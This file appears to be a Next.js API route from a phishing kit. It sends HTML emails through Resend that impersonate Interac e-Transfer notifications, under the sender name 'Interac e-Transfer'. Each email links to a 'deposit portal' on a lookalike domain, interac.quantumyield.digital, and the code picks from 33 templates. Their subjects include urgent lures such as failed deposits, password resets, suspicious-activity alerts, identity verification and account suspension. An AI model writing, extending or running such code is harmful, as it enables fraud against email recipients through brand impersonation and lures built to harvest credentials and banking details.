import { NextResponse } from "next/server"
import { generateEmailByTemplateId } from "@/lib/email-template-generators"

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const {
      recipientEmail,
      recipientName,
      amount,
      message,
      securityQuestion,
      securityAnswer,
      templateId,
      language,
    } = body

    // Validate required fields
    if (!recipientEmail || !recipientName || !amount) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 })
    }

    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    if (!emailRegex.test(recipientEmail)) {
      return NextResponse.json({ error: "Invalid email address" }, { status: 400 })
    }

    // Validate amount
    const amountNum = Number.parseFloat(String(amount).replace(/,/g, ""))
    if (isNaN(amountNum) || amountNum <= 0) {
      return NextResponse.json({ error: "Invalid amount" }, { status: 400 })
    }

    // Check for Resend API key
    const resendApiKey = process.env.RESEND_API_KEY
    if (!resendApiKey) {
      console.error("[v0] RESEND_API_KEY is not set")
      return NextResponse.json(
        { error: "Email service not configured. Please add RESEND_API_KEY to environment variables." },
        { status: 500 },
      )
    }

    const transferId = `INTC-${Date.now().toString().slice(-6)}-${Math.random().toString(36).substring(2, 9).toUpperCase()}`
    const timestamp = Date.now()

    // Build deposit link
    const depositBaseUrl = "https://interac.quantumyield.digital"
    const depositParams = new URLSearchParams({
      transferId,
      amount: amountNum.toString(),
      recipient: recipientEmail,
      recipientName,
      bankName: "QuantumYield",
      message: message || "",
      timestamp: timestamp.toString(),
    })
    const depositLink = `${depositBaseUrl}/deposit-portal?${depositParams.toString()}`

    // Resolve template ID — fall back to transfer-received for /send page
    const resolvedBase = templateId || "transfer-received"
    const resolvedId = language === "fr" ? `${resolvedBase}-fr` : resolvedBase



    // Generate email HTML using the 33-template system
    const emailHtml = generateEmailByTemplateId(resolvedId, {
      recipientName,
      amount: amountNum,
      message: message || undefined,
      securityQuestion: securityQuestion || undefined,
      securityAnswer: securityAnswer || undefined,
      transferId,
      depositLink,
      senderName: "QuantumYield Treasury",
      institution: "QuantumYield | Treasury & Vault Portal",
      bankName: "QuantumYield",
    })

    if (!emailHtml) {
      console.error("[v0] Unknown template ID:", resolvedId)
      return NextResponse.json({ error: `Unknown template: ${resolvedId}` }, { status: 400 })
    }

    // Build subject based on template type
    const subjectMap: Record<string, string> = {
      "transfer-received":      `You've received an Interac e-Transfer for ${formatAmount(amountNum)}`,
      "transfer-sent":          `Your Interac e-Transfer of ${formatAmount(amountNum)} was sent`,
      "transfer-pending":       `Action Required: Interac e-Transfer of ${formatAmount(amountNum)} pending`,
      "transfer-cancelled":     `Your Interac e-Transfer of ${formatAmount(amountNum)} was cancelled`,
      "transfer-expired":       `Your Interac e-Transfer of ${formatAmount(amountNum)} has expired`,
      "deposit-completed":      `Your Interac e-Transfer deposit of ${formatAmount(amountNum)} is complete`,
      "deposit-failed":         `Action Required: Your deposit of ${formatAmount(amountNum)} failed`,
      "deposit-reminder":       `Reminder: Unclaimed Interac e-Transfer of ${formatAmount(amountNum)}`,
      "deposit-instructions":   `How to deposit your Interac e-Transfer`,
      "auto-deposit-enabled":   `Interac e-Transfer Auto-Deposit Enabled`,
      "security-question-updated": `Your Interac e-Transfer security settings were updated`,
      "suspicious-activity":    `Security Alert: Unusual activity on your account`,
      "password-reset":         `Reset your Interac e-Transfer password`,
      "two-factor-enabled":     `Two-Factor Authentication Enabled`,
      "login-notification":     `New sign-in to your Interac e-Transfer account`,
      "account-verified":       `Your account has been verified`,
      "profile-updated":        `Your profile was updated`,
      "bank-linked":            `Bank account linked successfully`,
      "limit-increase":         `Your transfer limit has been increased`,
      "money-request":          `${recipientName} is requesting ${formatAmount(amountNum)}`,
      "request-accepted":       `Your money request was accepted`,
      "request-declined":       `Your money request was declined`,
      "transfer-receipt":       `Your Interac e-Transfer receipt`,
      "scheduled-transfer":     `Reminder: Scheduled Interac e-Transfer tomorrow`,
      "deposit-on-hold":        `Your deposit is temporarily on hold`,
      "two-factor-code":        `Your one-time verification code`,
      "welcome-onboard":        `Welcome to Interac e-Transfer via QuantumYield`,
      "account-suspended":      `Your account has been temporarily suspended`,
      "referral-bonus":         `You've earned a referral bonus!`,
      "kyc-verification":       `Action Required: Verify your identity`,
      "aml-hold":               `Transaction hold applied — compliance review`,
      "monthly-statement":      `Your Interac e-Transfer monthly statement is ready`,
      "large-transaction-review": `Large transaction — additional verification required`,
    }

    const subject =
      subjectMap[resolvedBase] ||
      `Interac e-Transfer Notification — ${formatAmount(amountNum)}`

    // Prefix subject with [FR] indicator when French
    const finalSubject = language === "fr" ? `[FR] ${subject}` : subject

    const fromAddress = process.env.RESEND_FROM_EMAIL || "Interac e-Transfer <onboarding@resend.dev>"

    // Warn if using the default onboarding@resend.dev sender — it only delivers to the Resend account owner
    if (fromAddress.includes("onboarding@resend.dev")) {
      console.warn("[v0] WARNING: Using onboarding@resend.dev — Resend only delivers to the verified account owner's email. Set RESEND_FROM_EMAIL to a verified domain sender.")
    }

    console.log("[v0] Sending email — from:", fromAddress, "to:", recipientEmail, "subject:", finalSubject, "templateId:", resolvedId)

    // Send via Resend
    const resendResponse = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${resendApiKey}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        from: fromAddress,
        to: [recipientEmail],
        subject: finalSubject,
        html: emailHtml,
      }),
    })

    const resendData = await resendResponse.json()
    console.log("[v0] Resend response status:", resendResponse.status, "body:", JSON.stringify(resendData))

    if (!resendResponse.ok) {
      const errorMsg = resendData?.message || resendData?.name || JSON.stringify(resendData)
      const hint = fromAddress.includes("onboarding@resend.dev")
        ? " — NOTE: onboarding@resend.dev can only send to the Resend account owner. Set RESEND_FROM_EMAIL to a verified domain."
        : ""
      return NextResponse.json(
        { error: `Resend error (${resendResponse.status}): ${errorMsg}${hint}` },
        { status: 500 }
      )
    }

    return NextResponse.json({
      success: true,
      transferId,
      emailId: resendData?.id,
      message: "Interac e-Transfer sent successfully",
    })
  } catch (error) {
    console.error("[v0] Error in send-interac API:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}

function formatAmount(n: number): string {
  return new Intl.NumberFormat("en-CA", { style: "currency", currency: "CAD" }).format(n)
}
